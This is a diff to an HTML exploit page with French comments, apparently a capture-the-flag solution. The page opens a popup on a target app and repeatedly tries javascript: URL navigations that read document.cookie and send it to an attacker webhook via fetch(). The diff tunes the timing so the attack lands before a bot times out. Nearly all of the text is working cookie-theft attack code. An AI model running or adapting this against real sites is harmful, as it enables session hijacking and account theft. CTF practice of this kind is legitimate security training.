@@ -18,41 +18,51 @@ let n = 0;
 function attemptLeak() {
   n++;
   try {
-    // Ouvrir/réutiliser le popup
+    // Ouvrir le popup DIRECTEMENT sur le domaine cible (pas about:blank)
     if (!w || w.closed) {
       w = window.open(target, "_blank");
-      console.log("POPUP-OPENED");
+      console.log("POPUP-OPENED-" + target);
     }
 
-    // 3 variantes de navigation javascript: pour tester laquelle marche
-    const js = "javascript:{" +
+    // JavaScript URL pour extraire et envoyer le cookie
+    // Exécuté dans le contexte de T2 (http://10-fast-fishers-app:5000/)
+    const js = "javascript:(function(){" +
       "const c = document.cookie;" +
       "console.log('COOKIE-VALUE:' + c);" +
-      "if(c) fetch('" + WEBHOOK + "?flag=' + encodeURIComponent(c)).catch(()=>{});" +
-      "}";
+      "if(c && c.length > 0) {" +
+        "fetch('" + WEBHOOK + "?stolen=' + encodeURIComponent(c)).catch(()=>{});" +
+      "}" +
+      "})()";
     
-    try { 
-      w.location = js; 
-      console.log("ATTEMPT-loc");
-    } catch (e) { 
-      console.log("ATTEMPT-loc-err:" + e.message); 
-    }
+    // Essayer les 3 variantes avec petit délai entre (pas simultanément!)
+    setTimeout(() => {
+      try { 
+        w.location = js; 
+        console.log("ATTEMPT-loc-" + n);
+      } catch (e) { 
+        console.log("ATTEMPT-loc-err:" + e.message); 
+      }
+    }, 0);
     
-    try { 
-      w.location.href = js;
-      console.log("ATTEMPT-href"); 
-    } catch (e) { 
-      console.log("ATTEMPT-href-err:" + e.message); 
-    }
+    setTimeout(() => {
+      try { 
+        w.location.href = js;
+        console.log("ATTEMPT-href-" + n); 
+      } catch (e) { 
+        console.log("ATTEMPT-href-err:" + e.message); 
+      }
+    }, 150);
     
-    try { 
-      w.location.replace(js);
-      console.log("ATTEMPT-replace"); 
-    } catch (e) { 
-      console.log("ATTEMPT-replace-err:" + e.message); 
-    }
+    setTimeout(() => {
+      try { 
+        w.location.replace(js);
+        console.log("ATTEMPT-replace-" + n); 
+      } catch (e) { 
+        console.log("ATTEMPT-replace-err:" + e.message); 
+      }
+    }, 300);
 
-    console.log("ATTEMPT-" + n);
+    console.log("CYCLE-" + n);
   } catch (e) {
     console.log("ATTEMPT-ERR:" + e.message);
   }
@@ -63,13 +73,19 @@ function attemptLeak() {
   }
 }
 
-// TIMING CRITIQUE: attendre plus longtemps avant la première tentative
-// pour que les cookies soient chargés dans T2
+// TIMING CRITIQUE: 
+// 1. S'ouvrir (about:blank)
+// 2. Naviguer vers http://10-fast-fishers-app:5000/
+// 3. Charger les cookies du domaine
+// 
+// Bot timeout = 5 secondes total
+// Strategy: commencer tôt (1.5s) mais espacer les tentatives (900ms)
+// pour que T2 ait le temps de charger entre chaque essai
 setTimeout(() => {
   console.log("STARTING-LEAK-LOOP");
   attemptLeak();
-  const iv = setInterval(attemptLeak, 600);
-}, 3000); // 3 secondes au lieu de 1.5 = plus de temps pour charger les cookies
+  const iv = setInterval(attemptLeak, 900); // 900ms entre chaque tentative
+}, 1500); // Start après 1.5s (laisse time à T2 de s'ouvrir)
 
 </script>
 </body>
